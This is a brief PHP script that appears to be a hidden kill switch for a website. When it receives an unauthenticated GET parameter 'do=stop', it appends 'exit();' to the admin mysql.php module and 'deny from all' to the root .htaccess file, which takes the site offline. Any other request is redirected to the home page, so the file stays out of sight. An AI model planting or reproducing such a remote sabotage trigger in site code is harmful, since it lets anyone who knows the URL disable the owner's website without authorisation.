<?
if (isset($_GET["do"]) && $_GET["do"]=='stop')
{
	$textWritePHP = '
exit();'; 
	$textWriteHtaccess = '
deny from all'; 
	
	$fp = fopen($_SERVER['DOCUMENT_ROOT']."/admin/modules/general/mysql.php", "a"); 
	$write_to_file = fwrite($fp, $textWritePHP); 
	fclose($fp); 
	
	$fp2 = fopen($_SERVER['DOCUMENT_ROOT']."/.htaccess", "a"); 
	$write_to_file2 = fwrite($fp2, $textWriteHtaccess); 
	fclose($fp2);  
}
else
	header("Location: /");
?>